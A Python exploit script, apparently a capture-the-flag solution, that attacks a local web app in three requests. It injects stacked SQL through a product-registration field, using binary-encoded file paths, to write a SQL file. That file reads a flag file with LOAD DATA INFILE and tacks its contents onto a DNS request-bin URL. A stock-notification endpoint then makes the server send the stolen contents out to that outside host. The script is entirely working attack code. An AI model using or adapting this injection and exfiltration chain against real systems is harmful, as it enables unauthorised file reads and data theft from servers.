import requests
import json

base_url = "http://localhost:4001"

# step 1 -> inject sql statement to create new entry

dns_req_bin = input("Enter your dns req bin url (.url.com): ")

data = {"stockid": "416", "name": "a", "quantity": "0", "vurl": "a'); SET @f=0b001011110110100001101111011011010110010100101111011000110111010001100110001011110110011001101100011000010110011100101110011101000111100001110100; SET @w=0b0010111101101000011011110110110101100101001011110110001101110100011001100010111101100001011100000111000000101111011001000110001000101111011100100111000000101110011100110111000101101100; SET @q = CONCAT(\"LOAD DATA INFILE '\", @f, \"' INTO TABLE stock (@t) SET stockid=111, quantity=0, vurl=CONCAT(@t, '" + dns_req_bin + "');\"); SET @z = CONCAT(\"SELECT @q INTO OUTFILE '\", @w,\"'\"); PREPARE s from @z; EXECUTE s;-- "}
data_json = json.dumps(data)
headers = {"Content-Type": "application/json"}

r = requests.post(base_url + "/api/registerproduct", headers=headers, data=data_json)

print(r.text)

# step 2 -> execute sql

data = {"filename": "rp.sql"}
data_json = json.dumps(data)
headers = {"Content-Type": "application/json"}

r = requests.post(base_url + "/api/initializedb", headers=headers, data=data_json)

print(r.text)

# step 3 -> execute data

data = {"stockid": "111"}
data_json = json.dumps(data)
headers = {"Content-Type": "application/json"}

r = requests.post(base_url + "/api/notifystock", headers=headers, data=data_json)

print("Exploit complete, check reqbin")
